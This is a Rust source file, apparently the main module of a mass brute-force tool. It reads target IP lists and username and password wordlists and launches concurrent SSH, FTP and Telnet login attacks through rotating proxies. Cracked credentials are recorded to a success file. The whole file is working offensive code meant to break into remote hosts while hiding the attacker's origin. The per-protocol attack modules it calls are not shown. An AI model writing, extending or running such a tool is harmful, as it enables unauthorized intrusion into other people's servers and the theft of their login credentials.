mod ssh;
mod ftp;
mod telnet;
mod events;
mod proxy;

use anyhow::Result;
use futures::stream::{FuturesUnordered, StreamExt};
use std::{
    fs::File,
    io::{BufRead, BufReader},
    sync::{Arc, Mutex},
    collections::HashSet,
};
use tokio::{sync::Semaphore, fs::OpenOptions, io::AsyncWriteExt};
use events::BruteEvent;
use crate::proxy::{pick_random_untried_proxy, parse_proxy_line};

const MAX_CONCURRENT_IPS: usize = 10;

#[tokio::main]
async fn main() -> Result<()> {
    let usernames = Arc::new(load_file("usernames.txt")?);
    let passwords = Arc::new(load_file("passwords.txt")?);

    let raw_proxies = load_file("proxies.txt")?;
    let proxies: Vec<String> = raw_proxies.iter().map(|line| parse_proxy_line(line)).collect();

    let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_IPS));
    let mut tasks: FuturesUnordered<tokio::task::JoinHandle<Result<Vec<BruteEvent>>>> = FuturesUnordered::new();

    let file = File::open("ips.txt")?;
    let reader = BufReader::new(file);

    let mut success_file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("success.txt")
        .await?;

    let tried_proxies = Arc::new(Mutex::new(HashSet::new()));

    for line in reader.lines() {
        let ip = line?;
        let usernames = Arc::clone(&usernames);
        let passwords = Arc::clone(&passwords);
        let proxies = proxies.clone();
        let tried_proxies = Arc::clone(&tried_proxies);
        let permit = Arc::clone(&semaphore).acquire_owned().await?;

        tasks.push(tokio::spawn(async move {
            let proxy_choice = {
                let mut tried = tried_proxies.lock().unwrap();
                pick_random_untried_proxy(&proxies, &mut tried)
            };

            let proxy = proxy_choice.unwrap_or_default();
            if !proxy.is_empty() {
                println!("[*] Using proxy: {}", proxy);
            }

            let ssh_task = tokio::spawn(ssh::bruteforce_ip(
            ip.clone(),
            Arc::clone(&usernames),
            Arc::clone(&passwords),
            proxy.clone(), // <-- add this!
            ));


            let ftp_task = tokio::spawn(ftp::bruteforce_ip(
                ip.clone(),
                Arc::clone(&usernames),
                Arc::clone(&passwords),
                proxy.clone(),
            ));

            let telnet_task = tokio::spawn(telnet::bruteforce_ip(
            ip.clone(),
            Arc::clone(&usernames),
            Arc::clone(&passwords),
            proxy.clone(),  // <-- fixed now
            ));

            let (ssh_events, ftp_events, telnet_events) = tokio::join!(ssh_task, ftp_task, telnet_task);

            drop(permit);

            let mut all_events = Vec::new();
            if let Ok(ev) = ssh_events { all_events.extend(ev); }
            if let Ok(ev) = ftp_events { all_events.extend(ev); }
            if let Ok(ev) = telnet_events { all_events.extend(ev); }

            Ok(all_events)
        }));

        if tasks.len() >= MAX_CONCURRENT_IPS {
            if let Some(res) = tasks.next().await {
                if let Ok(events) = res? {
                    handle_events(events, &mut success_file).await?;
                }
            }
        }
    }

    while let Some(res) = tasks.next().await {
        if let Ok(events) = res? {
            handle_events(events, &mut success_file).await?;
        }
    }

    Ok(())
}

async fn handle_events(events: Vec<BruteEvent>, success_file: &mut tokio::fs::File) -> Result<()> {
    for event in events {
        match event {
            BruteEvent::Info(msg) => println!("[*] {}", msg),
            BruteEvent::Fail(msg) => println!("[!] {}", msg),
            BruteEvent::Error(msg) => println!("[x] {}", msg),
            BruteEvent::Success { protocol, ip, username, password, port } => {
                let line = format!("[+] {} Success: {}:{} - {}:{}\n", protocol, ip, port, username, password);
                print!("{}", line);
                success_file.write_all(line.as_bytes()).await?;
            }
        }
    }
    Ok(())
}

fn load_file(path: &str) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    Ok(reader.lines().filter_map(|line| line.ok()).collect())
}
